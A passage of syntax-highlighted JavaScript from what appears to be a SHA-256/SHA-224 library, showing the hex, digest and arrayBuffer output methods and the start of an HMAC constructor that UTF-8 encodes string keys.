operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h3 <span class="token operator">&gt;&gt;</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h3 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h3 <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h3 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h3 <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span>h3 <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h4 <span class="token operator">&gt;&gt;</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h4 <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h4 <span class="token operator">&gt;&gt;</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h4 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h4 <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h4 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h4 <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span>h4 <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h5 <span class="token operator">&gt;&gt;</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h5 <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h5 <span class="token operator">&gt;&gt;</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h5 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h5 <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h5 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h5 <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span>h5 <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h6 <span class="token operator">&gt;&gt;</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h6 <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h6 <span class="token operator">&gt;&gt;</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h6 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h6 <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h6 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h6 <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span>h6 <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>is224<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            hex <span class="token operator">+=</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h7 <span class="token operator">&gt;&gt;</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h7 <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h7 <span class="token operator">&gt;&gt;</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h7 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h7 <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h7 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h7 <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span>h7 <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> hex
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token class-name">Sha256</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString <span class="token operator">=</span> <span class="token class-name">Sha256</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>hex<span class="token punctuation">;</span>
    <span class="token class-name">Sha256</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">digest</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> h0 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h0<span class="token punctuation">,</span>
            h1 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h1<span class="token punctuation">,</span>
            h2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h2<span class="token punctuation">,</span>
            h3 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h3<span class="token punctuation">,</span>
            h4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h4<span class="token punctuation">,</span>
            h5 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h5<span class="token punctuation">,</span>
            h6 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h6<span class="token punctuation">,</span>
            h7 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h7<span class="token punctuation">;</span>
        <span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>h0 <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h0 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h0 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> h0 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h1 <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h1 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h1 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> h1 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h2 <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h2 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h2 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> h2 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h3 <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h3 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h3 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> h3 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h4 <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h4 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h4 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> h4 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h5 <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h5 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h5 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> h5 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h6 <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h6 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h6 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> h6 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>is224<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">(</span>h7 <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h7 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>h7 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> h7 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> arr
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token class-name">Sha256</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>array <span class="token operator">=</span> <span class="token class-name">Sha256</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>digest<span class="token punctuation">;</span>
    <span class="token class-name">Sha256</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">arrayBuffer</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>is224 <span class="token operator">?</span> <span class="token number">28</span> <span class="token operator">:</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> dataView <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        dataView<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h0<span class="token punctuation">)</span><span class="token punctuation">;</span>
        dataView<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        dataView<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        dataView<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        dataView<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h4<span class="token punctuation">)</span><span class="token punctuation">;</span>
        dataView<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h5<span class="token punctuation">)</span><span class="token punctuation">;</span>
        dataView<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h6<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>is224<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            dataView<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h7<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> buffer
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">HmacSha256</span><span class="token punctuation">(</span><span class="token parameter">key<span class="token punctuation">,</span> is224<span class="token punctuation">,</span> sharedMemory</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">var</span> i<span class="token punctuation">,</span> type <span class="token operator">=</span> <span class="token keyword">typeof</span> key<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">var</span> bytes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                length <span class="token operator">=</span> key<span class="token punctuation">.</span>length<span class="token punctuation">,</span>
                index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
                code<span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                code <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">&lt;</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    bytes<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> code
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">&lt;</span> <span class="token number">0x800</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    bytes<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0xc0</span> <span class="token operator">|</span> <span class="token punctuation">(</span>code <span class="token operator">&gt;&gt;</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    bytes<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span>code <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">&lt;</span> <span class="token number">0xd800</span> <span class="token operator">||</span> code <span class="token operator">&gt;=</span> <span class="token number">0xe000</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    bytes<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0xe0</span> <span class="token operator">|</span> <span class="token punctuation">(</span>code <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    bytes<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>code <span class="token operator">&gt;&gt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    bytes<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span>code <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                    code <span class="token operator">=</span> <span class="token number">0x10000</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>code <span class="token operator">&amp;</span> <span class="token number">0x3ff</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3ff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    bytes<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0xf0</span> <span class="token operator">|</span> <span class="token punctuation">(</span>code <span class="token operator">&gt;&gt;</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    bytes<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>code <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    bytes<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>code <span class="token operator">&gt;&gt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    bytes<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span>code <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            key <span class="token operator">=</span> bytes
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token constant">ERROR</span><span class="token punctuation">)</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">ARRAY_BUFFER</span> <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">.</span>constructor <span class="token operator">===</span> ArrayBuffer<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    key <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
